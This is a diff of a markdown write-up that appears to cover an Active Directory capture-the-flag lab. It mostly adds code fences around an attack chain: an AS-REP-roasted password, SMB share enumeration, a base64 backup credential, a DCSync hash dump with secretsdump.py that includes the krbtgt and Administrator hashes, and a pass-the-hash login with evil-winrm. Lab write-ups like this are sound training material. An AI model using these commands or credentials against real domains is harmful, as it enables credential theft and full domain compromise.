@@ -58,7 +58,7 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:9e9d37205ca2b017be8b60ae4decc7d8$4d81d58
 ```  svc-admin:management2005```
 
 # smbclient -L //10.10.83.246 -U 'svc-admin' 
-	Sharename       Type      Comment
+```	Sharename       Type      Comment
 	---------       ----      -------
 	ADMIN$          Disk      Remote Admin
 	backup          Disk      
@@ -66,16 +66,16 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:9e9d37205ca2b017be8b60ae4decc7d8$4d81d58
 	IPC$            IPC       Remote IPC
 	NETLOGON        Disk      Logon server share 
 	SYSVOL          Disk      Logon server share 
-
+```
 # smbclient //10.10.83.246/backup -U 'svc-admin'
 
 # smb: \> get backup_credentials.txt
-YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
+```YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
 backup@spookysec.local:backup2517860
-
+```
 #  DCSync
  python3 secretsdump.py -dc-ip 10.10.83.246 spookysec.local/backup:backup2517860@10.10.83.246 -use-vss
-
+```
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
@@ -91,12 +91,12 @@ spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b
 spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
 spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
 spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
-
+```
 
 #  Pass The Hash
     evil-winrm -i 10.10.83.246 -u administrator -H 0e0363213e37b94221497260b0bcb4fc
-
+```
 *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
 thm-ad\administrator
-
+```
 
